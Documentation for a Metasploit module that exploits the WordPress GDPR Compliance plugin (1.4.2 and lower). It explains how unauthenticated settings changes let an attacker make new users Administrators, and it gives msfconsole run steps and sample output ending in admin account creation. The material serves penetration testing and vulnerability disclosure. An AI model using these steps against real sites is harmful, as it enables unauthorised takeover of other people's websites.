## Description

  This module exploits the Wordpress GDPR compliance plugin lack of validation (WPVDB 9144), which affects versions 1.4.2 and lower.

  When a user triggers GDPR-related actions, Wordpress's admin-ajax.php is called but fails to do validation and capacity checks regarding the asked actions.
  This leads to any unauthenticated user being able to modify any arbitrary settings on the targeted server. 

  This module changes the admin email to prevent notification sending, enables new user registration and changes the default role of new users to Administrator. The attacker is then able to simply create a new privileged user, then log in and take any actions on the newly compromised site.

## Vulnerable Application

  Any Wordpress installation with the GDPR Compliance plugin <= 1.4.2.

  You can download the vulnerable application here: https://downloads.wordpress.org/plugin/wp-gdpr-compliance.1.4.2.zip

## Verification Steps

  Example steps in this format:

  1. Install the application
  1. Start msfconsole
  1. Do: `use auxiliary/admin/http/wp_gdpr_compliance_privilege_escalation`
  1. Do: `set RHOST [wp host]`
  1. Do: `set RPORT [wp port]`
  1. Do: `run`
  1. Go to the Wordpress registering page, register as an administrator, profit.

## Scenarios


Example run against WordPress GDPR Compliance plugin 1.4.2:
```
[*] Getting security token from host...
[*] Changing admin e-mail address to random@email.com...
[*] Enabling user registrations...
[*] Setting the default user role...
[+] Privilege escalation complete
[+] Create a new account at [url]/wp-login.php/?action=register to gain admin access.
[*] Auxiliary module execution completed
```
